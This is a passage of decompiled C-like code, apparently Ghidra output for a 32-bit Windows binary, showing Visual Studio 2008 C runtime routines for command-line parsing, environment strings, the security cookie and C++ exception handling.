  uVar1 = local_8;
  if ((((local_8 < 0x3fffffff) && (in_ECX < 0x7fffffff)) &&
      (_Size = (in_ECX + local_8 * 2) * 2, in_ECX * 2 <= _Size)) &&
     (ppsVar2 = (short **)__malloc_crt(_Size), ppsVar2 != (short **)0x0)) {
    _wparse_cmdline(ppsVar2 + uVar1,ppsVar2,(int *)&local_8);
    _DAT_00435f90 = local_8 - 1;
    iVar3 = 0;
    _DAT_00435f98 = ppsVar2;
  }
  else {
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsW
// 
// Library: Visual Studio 2008 Release

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  WCHAR WVar1;
  LPWCH _Src;
  WCHAR *pWVar2;
  WCHAR *pWVar3;
  size_t _Size;
  void *_Dst;
  
  _Src = GetEnvironmentStringsW();
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar3 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar2 = pWVar3;
        pWVar3 = pWVar2 + 1;
      } while (*pWVar3 != L'\0');
      pWVar3 = pWVar2 + 2;
      WVar1 = *pWVar3;
    }
    _Size = (int)pWVar3 + (2 - (int)_Src);
    _Dst = __malloc_crt(_Size);
    if (_Dst != (void *)0x0) {
      _memcpy(_Dst,_Src,_Size);
    }
    FreeEnvironmentStringsW(_Src);
    return _Dst;
  }
  return (LPVOID)0x0;
}



LPWSTR GetCommandLineW(void)

{
  LPWSTR pWVar1;
  
                    // WARNING: Could not recover jumptable at 0x00420540. Too many branches
                    // WARNING: Treating indirect jump as call
  pWVar1 = GetCommandLineW();
  return pWVar1;
}



// WARNING: Removing unreachable block (ram,0x0042055a)
// WARNING: Removing unreachable block (ram,0x00420560)
// WARNING: Removing unreachable block (ram,0x00420562)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2008 Release

void __RTC_Initialize(void)

{
  return;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2008 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_00432c20 == 0xbb40e64e) || ((DAT_00432c20 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_00432c20 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_00432c20 == 0xbb40e64e) {
      DAT_00432c20 = 0xbb40e64f;
    }
    else if ((DAT_00432c20 & 0xffff0000) == 0) {
      DAT_00432c20 = DAT_00432c20 | DAT_00432c20 << 0x10;
    }
    DAT_00432c24 = ~DAT_00432c20;
  }
  else {
    DAT_00432c24 = ~DAT_00432c20;
  }
  return;
}



// Library Function - Single Match
//  public: __thiscall std::bad_exception::bad_exception(char const *)
// 
// Library: Visual Studio 2008 Release

bad_exception * __thiscall std::bad_exception::bad_exception(bad_exception *this,char *param_1)

{
  exception::exception((exception *)this,&param_1);
  *(undefined ***)this = vftable;
  return this;
}



undefined4 * __thiscall FUN_00420651(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_exception::vftable;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___TypeMatch
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_004206d0:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_004206af:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_004206d0;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_004206af;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___FrameUnwindFilter
// 
// Library: Visual Studio 2008 Release

_ptiddata __cdecl ___FrameUnwindFilter(int **param_1)

{
  _ptiddata p_Var1;
  
  if (**param_1 == -0x1fbcb0b3) {
    p_Var1 = __getptd();
    if (0 < p_Var1->_ProcessingThrow) {
      p_Var1 = __getptd();
      p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
    }
  }
  else if (**param_1 == -0x1f928c9d) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = 0;
    terminate();
    return p_Var1;
  }
  return (_ptiddata)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___FrameUnwindToState
// 
// Library: Visual Studio 2008 Release

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int *piVar3;
  int iVar4;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar4 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar4 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar4 != param_4) {
    if ((iVar4 < 0) || (*(int *)(param_3 + 4) <= iVar4)) {
      _inconsistency();
    }
    iVar2 = iVar4 * 8;
    piVar3 = (int *)(*(int *)(param_3 + 8) + iVar2);
    iVar4 = *piVar3;
    if (piVar3[1] != 0) {
      *(int *)(param_1 + 8) = iVar4;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar2),param_1,0x103);
    }
  }
  FUN_004207e6();
  if (iVar4 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar4;
  return;
}



void FUN_004207e6(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___DestructExceptionObject
// 
// Library: Visual Studio 2008 Release

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



// Library Function - Single Match
//  ___AdjustPointer
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



// Library Function - Single Match
//  unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2008 Release

uchar __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  int local_c;
  uchar local_5;
  
  if (unaff_EDI == (int *)0x0) {
    _inconsistency();
    terminate();
  }
  local_c = 0;
  local_5 = '\0';
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = '\x01';
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      local_c = local_c + 1;
    } while (local_c < *unaff_EDI);
  }
  return local_5;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3

void FUN_0042093f(void *param_1)

{
  code *pcVar1;
  _ptiddata p_Var2;
  
  p_Var2 = __getptd();
  if (p_Var2->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  FUN_0042131a();
  terminate();
  p_Var2 = __getptd();
  p_Var2->_curexcspec = param_1;
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void Catch_All_00420970(void)

{
  code *pcVar1;
  _ptiddata p_Var2;
  int unaff_EBP;
  
  p_Var2 = __getptd();
  p_Var2->_curexcspec = *(void **)(unaff_EBP + 8);
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
// _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,ulong param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00430548;
  uStack_c = 0x420994;
  local_38 = 0;
  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_00420aae();
  return local_20;
}



void FUN_00420aae(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObjectHelper
// 
// Library: Visual Studio 2008 Release

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  uint in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          _memmove(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        _memmove(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_00420ba9;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_00420ba9:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObject
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else if (CONCAT31(extraout_var,cVar1) == 2) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  return;
}



// Library Function - Single Match
//  void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
// *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
// 
// Library: Visual Studio 2008 Release

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,uchar param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  int *unaff_ESI;
  int *unaff_EDI;
  int *piVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  piVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  unaff_ESI[2] = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,(EHRegistrationNode *)unaff_ESI,(_CONTEXT *)param_2,
                          (_s_FuncInfo *)param_4,param_6,0x100,(ulong)piVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,(EHRegistrationNode *)unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
// *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  TypeDescriptor *pTVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  int iVar4;
  _s_TryBlockMapEntry *p_Var5;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint extraout_var;
  uint uVar6;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var2 = __getptd();
    uVar6 = extraout_var;
    if (p_Var2->_translator != (void *)0x0) {
      p_Var2 = __getptd();
      pvVar3 = (void *)__encoded_null();
      if (((p_Var2->_translator != pvVar3) && (*(int *)param_1 != -0x1fbcb0b3)) &&
         (iVar4 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar4 != 0)) {
        return;
      }
    }
    if (param_5->nTryBlocks == 0) {
      _inconsistency();
    }
    p_Var5 = _GetRangeOfTrysToCheck(param_5,param_7,param_6,&local_8,(uint *)&stack0xfffffff4);
    if (local_8 < uVar6) {
      do {
        if ((p_Var5->tryLow <= param_6) && (param_6 <= p_Var5->tryHigh)) {
          pTVar1 = p_Var5->pHandlerArray[p_Var5->nCatches + -1].pType;
          if (((pTVar1 == (TypeDescriptor *)0x0) || (*(char *)&pTVar1[1].pVFTable == '\0')) &&
             ((*(byte *)&p_Var5->pHandlerArray[p_Var5->nCatches + -1].adjectives & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,(uchar)uVar6);
          }
        }
        local_8 = local_8 + 1;
        p_Var5 = p_Var5 + 1;
      } while (local_8 < uVar6);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,uchar param_6,int param_7,EHRegistrationNode *param_8)

{
  int *piVar1;
  _s_FuncInfo *p_Var2;
  uchar uVar3;
  bool bVar4;
  _ptiddata p_Var5;
  int iVar6;
  _s_TryBlockMapEntry *p_Var7;
  EHRegistrationNode *unaff_EBX;
  _s_FuncInfo *p_Var8;
  _s_FuncInfo **pp_Var9;
  int unaff_ESI;
  _s_FuncInfo *p_Var10;
  _s_TryBlockMapEntry *unaff_EDI;
  EHRegistrationNode *pEVar11;
  bad_exception in_stack_ffffffd0;
  uint local_20;
  int local_1c;
  _s_FuncInfo *local_18;
  uint local_14;
  HandlerType *local_10;
  int local_c;
  char local_5;
  
  local_5 = '\0';
  if (param_5->maxState < 0x81) {
    local_c = (int)(char)param_2[8];
  }
  else {
    local_c = *(int *)(param_2 + 8);
  }
  if ((local_c < -1) || (param_5->maxState <= local_c)) {
    _inconsistency();
  }
  p_Var10 = (_s_FuncInfo *)param_1;
  if (*(int *)param_1 != -0x1f928c9d) goto LAB_0042119a;
  p_Var8 = (_s_FuncInfo *)0x19930520;
  if (*(int *)(param_1 + 0x10) != 3) goto LAB_00421007;
  iVar6 = *(int *)(param_1 + 0x14);
  if (((iVar6 != 0x19930520) && (iVar6 != 0x19930521)) && (iVar6 != 0x19930522)) goto LAB_00421007;
  if (*(int *)(param_1 + 0x1c) != 0) goto LAB_00421007;
  p_Var5 = __getptd();
  if (p_Var5->_curexception != (void *)0x0) {
    p_Var5 = __getptd();
    param_1 = (EHExceptionRecord *)p_Var5->_curexception;
    p_Var5 = __getptd();
    param_3 = (_CONTEXT *)p_Var5->_curcontext;
    iVar6 = _ValidateRead(param_1,1);
    if (iVar6 == 0) {
      _inconsistency();
    }
    if ((((*(int *)param_1 == -0x1f928c9d) && (*(int *)((int)param_1 + 0x10) == 3)) &&
        ((iVar6 = *(int *)((int)param_1 + 0x14), iVar6 == 0x19930520 ||
         ((iVar6 == 0x19930521 || (iVar6 == 0x19930522)))))) && (*(int *)((int)param_1 + 0x1c) == 0)
       ) {
      _inconsistency();
    }
    p_Var5 = __getptd();
    if (p_Var5->_curexcspec == (void *)0x0) goto LAB_00421007;
    p_Var5 = __getptd();
    piVar1 = (int *)p_Var5->_curexcspec;
    p_Var5 = __getptd();
    iVar6 = 0;
    p_Var5->_curexcspec = (void *)0x0;
    uVar3 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI);
    if (uVar3 != '\0') goto LAB_00421007;
    p_Var8 = (_s_FuncInfo *)0x0;
    if (0 < *piVar1) {
      do {
        bVar4 = type_info::operator==
                          (*(type_info **)((int)&p_Var8->maxState + piVar1[1]),
                           (type_info *)&std::bad_exception::RTTI_Type_Descriptor);
        if (bVar4) goto LAB_00420fd8;
        iVar6 = iVar6 + 1;
        p_Var8 = (_s_FuncInfo *)&p_Var8->pTryBlockMap;
      } while (iVar6 < *piVar1);
    }
    do {
      terminate();
LAB_00420fd8:
      ___DestructExceptionObject((int *)param_1);
      std::bad_exception::bad_exception((bad_exception *)&stack0xffffffd0,"bad exception");
      __CxxThrowException_8(&stack0xffffffd0,&DAT_004305ac);
LAB_00421007:
      p_Var10 = (_s_FuncInfo *)param_1;
      if (((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x10) == 3)) &&
         ((p_Var2 = *(_s_FuncInfo **)(param_1 + 0x14), p_Var2 == p_Var8 ||
          ((p_Var2 == (_s_FuncInfo *)0x19930521 || (p_Var2 == (_s_FuncInfo *)0x19930522)))))) {
        if (param_5->nTryBlocks != 0) {
          p_Var7 = _GetRangeOfTrysToCheck(param_5,param_7,local_c,&local_14,&local_20);
          for (; local_14 < local_20; local_14 = local_14 + 1) {
            if ((p_Var7->tryLow <= local_c) && (local_c <= p_Var7->tryHigh)) {
              local_10 = p_Var7->pHandlerArray;
              for (local_1c = p_Var7->nCatches; 0 < local_1c; local_1c = local_1c + -1) {
                pp_Var9 = *(_s_FuncInfo ***)(*(int *)(param_1 + 0x1c) + 0xc);
                for (local_18 = *pp_Var9; 0 < (int)local_18;
                    local_18 = (_s_FuncInfo *)((int)&local_18[-1].EHFlags + 3)) {
                  pp_Var9 = pp_Var9 + 1;
                  p_Var10 = *pp_Var9;
                  iVar6 = ___TypeMatch((byte *)local_10,(byte *)p_Var10,*(uint **)(param_1 + 0x1c));
                  if (iVar6 != 0) {
                    local_5 = '\x01';
                    CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                            p_Var10,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,unaff_EDI,
                            unaff_ESI,unaff_EBX,(uchar)in_stack_ffffffd0);
                    goto LAB_004210f0;
                  }
                }
                local_10 = local_10 + 1;
              }
            }
LAB_004210f0:
            p_Var7 = p_Var7 + 1;
          }
        }
        if (param_6 != '\0') {
          ___DestructExceptionObject((int *)param_1);
        }
        if ((((local_5 != '\0') || ((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930521))
            || (param_5->pESTypeList == (ESTypeList *)0x0)) ||
           (uVar3 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI), uVar3 != '\0'))
        goto LAB_004211c6;
        __getptd();
        __getptd();
        p_Var5 = __getptd();
        p_Var5->_curexception = param_1;
        p_Var5 = __getptd();
        p_Var5->_curcontext = param_3;
        pEVar11 = param_8;
        if (param_8 == (EHRegistrationNode *)0x0) {
          pEVar11 = param_2;
        }
        _UnwindNestedFrames(pEVar11,param_1);
        ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
        FUN_0042093f(param_5->pESTypeList);
        p_Var10 = param_5;
      }
LAB_0042119a:
      if (param_5->nTryBlocks == 0) goto LAB_004211c6;
      p_Var8 = param_5;
    } while (param_6 != '\0');
    FindHandlerForForeignException
              ((EHExceptionRecord *)p_Var10,param_2,param_3,param_4,param_5,local_c,param_7,param_8)
    ;
LAB_004211c6:
    p_Var5 = __getptd();
    if (p_Var5->_curexcspec != (void *)0x0) {
      _inconsistency();
    }
  }
  return;
}



undefined4 * __thiscall FUN_004211de(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_exception::vftable;
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___InternalCxxFrameHandler
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl
___InternalCxxFrameHandler
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7,uchar param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*param_1 == -0x1f928c9d)) ||
      (*param_1 == -0x7fffffda)) ||
     (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522 ||
      ((*(byte *)&param_5->EHFlags & 1) == 0)))) {
    if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
      if ((param_5->nTryBlocks != 0) ||
         ((0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff) &&
          (param_5->pESTypeList != (ESTypeList *)0x0)))) {
        if ((*param_1 == -0x1f928c9d) &&
           (((2 < (uint)param_1[4] && (0x19930522 < (uint)param_1[5])) &&
            (*(code **)(param_1[7] + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(param_1[7] + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar2;
        }
        FindHandler((EHExceptionRecord *)param_1,param_2,param_3,param_4,param_5,param_8,param_6,
                    param_7);
      }
    }
    else if ((param_5->maxState != 0) && (param_6 == 0)) {
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
    }
  }
  return 1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



void FUN_0042131a(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl _inconsistency(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)__decode_pointer(DAT_004369cc);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __initp_eh_hooks
// 
// Library: Visual Studio 2008 Release

void __initp_eh_hooks(void)

{
  DAT_004369cc = __encode_pointer(0x4212e1);
  return;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2008 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  _PHNDLR p_Var2;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  if (((byte)DAT_004339f0 & 1) != 0) {
    __NMSG_WRITE(10);
  }
  p_Var2 = ___get_sigabrt();
  if (p_Var2 != (_PHNDLR)0x0) {
    _raise(0x16);
  }
